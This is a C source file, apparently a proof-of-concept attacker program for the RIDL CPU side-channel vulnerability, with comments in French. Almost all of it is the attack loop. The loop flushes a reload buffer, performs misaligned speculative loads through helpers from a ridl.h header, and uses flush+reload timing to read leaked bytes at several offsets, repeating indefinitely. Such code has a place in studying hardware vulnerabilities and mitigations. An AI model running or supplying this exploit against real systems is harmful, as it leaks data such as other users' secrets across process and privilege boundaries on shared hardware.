/* attack.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h> // Nécessaire pour les types d'adresses et PRIuPTR
#include "ridl.h"


#define ITERS 10000
#define START 1
#define END 10

#define NC    "\033[0m"
#define GREEN "\033[0;32m"
#define CYAN  "\033[0;36m"
#define RED   "\033[0;31m"
void print_log(const char *msg) {printf(GREEN "[+] " NC "%s\n", msg);}
void print_info(const char *msg) {printf(CYAN "    %s" NC "\n", msg);}


int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    print_log("Attacker running. Listening on shared buffers...");

    // 1. Initialisation
    enable_SSBM();
    ALLOC_BUFFERS();

    print_info("RIDL buffers initialized.");
    printf(CYAN "    Leak Buffer (leak) address: %p" NC "\n", leak);
    printf(CYAN "    Reload Buffer (reloadbuffer) address: %p" NC "\n", reloadbuffer);

    // Vérification de l'alignement sur 64 octets, en utilisant un cast sécurisé
    unsigned long long leak_mod_64 = (unsigned long long)((uintptr_t)leak % 64);
    unsigned long long reload_mod_64 = (unsigned long long)((uintptr_t)reloadbuffer % 64);

    if (leak_mod_64 != 0 || reload_mod_64 != 0) {
        printf(RED "[FATAL ERROR] Alignment issue detected! Leak Modulo 64: %llu, Reload Modulo 64: %llu\n" NC, 
               leak_mod_64, reload_mod_64);
        return 1; 
    } else {
        print_info("Buffers are 64-byte aligned (verified).");
    }
    printf("---------------------------------------------------\n");
    // **********************************************


    // 2. Boucle principale de l'attaque
    while(1) {
        for (size_t offset = START; offset < END; ++offset) {
            
            memset(results, 0, sizeof(results));

            enable_alignment_checks();
            
            for (size_t i = 0; i < ITERS; ++i) {
                
                // a. On charge quelque chose dans le cache (load)
                asm volatile("mov 0x0(%%rsp), %%rax\n":::"rax");
                
                // b. Flush du buffer de réception
                flush(reloadbuffer);
                asm volatile("mfence\n");

                // c. L'attaque spéculative (lecture mal alignée)
                speculate_leak_normal(leak + offset, reloadbuffer);

                // d. Analyse du canal auxiliaire (Side-channel)
                reload(reloadbuffer, results);
            }
            
            disable_alignment_checks();

            printf("offset %d:" GREEN " ", (int)offset);
            print_results(results);
        printf(NC "\n");
        }
    }

    return 0;
}
